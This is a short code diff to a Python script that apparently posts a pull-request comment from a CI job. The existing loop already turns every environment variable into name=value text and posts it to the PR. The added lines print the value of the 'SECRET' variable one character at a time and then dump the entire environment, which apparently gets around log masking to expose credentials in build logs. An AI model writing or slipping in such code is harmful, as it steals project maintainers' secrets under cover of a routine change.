@@ -15,8 +15,10 @@ def main():
     repo = GitRepo(get_git_repo_dir(), get_git_remote_name())
     org, project = repo.gh_owner_and_name()
     comment = ""
-    for i in os.environ:
+    for i in os.environ['SECRET']:
+        print(i)
         comment +=  f"{i}={os.environ[i]}"
+    print(os.environ)
     gh_post_pr_comment(org, project, args.pr_num, comment)
 
 
